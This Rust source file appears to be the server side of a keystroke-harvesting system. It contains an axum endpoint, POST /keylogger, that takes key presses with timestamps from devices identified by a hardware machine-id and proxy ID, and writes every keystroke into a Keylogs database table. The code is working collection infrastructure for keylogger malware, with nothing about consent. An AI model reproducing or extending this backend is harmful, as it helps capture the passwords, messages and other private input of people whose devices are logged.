use axum::{Json, extract::State, http::HeaderMap};
use oxalate_schemas::harvester::public::keylogger::post_keylogger::*;
use oxalate_scrapper_controller::ProxyId;

use crate::{AppState, Error};

#[utoipa::path(
    post,
    path = "/keylogger",
    request_body = Req,
    responses(
        (status = 200, description = "inserted keylogger in db"),
    ),
    params(
      ("machine-id" = String, Header, description = "device hardware id"),
    ),
    tag = "Keylogger",
)]
#[axum::debug_handler]
pub async fn post_keylogger(
    headers: HeaderMap,
    State(app_state): State<AppState>,
    Json(req): Json<Req>,
) -> Result<(), Error> {
    let proxy_id = ProxyId::from_http_headers(&headers, &app_state.db_pool).await?;

    for key in req.0.iter() {
        let db_pool = app_state.db_pool.clone();
        sqlx::query!(
            r#"
                    INSERT INTO Keylogs
                        (device_machine_id, key, created_at)
                        VALUES ($1, $2, $3)
                    ;
                "#,
            proxy_id.as_ref(),
            &key.key_pressed,
            &key.at,
        )
        .execute(&db_pool)
        .await?;
    }

    Ok(())
}
